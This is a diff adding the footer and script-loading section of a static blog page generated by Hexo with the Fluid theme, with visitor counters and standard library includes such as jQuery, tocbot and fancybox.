+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客量 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
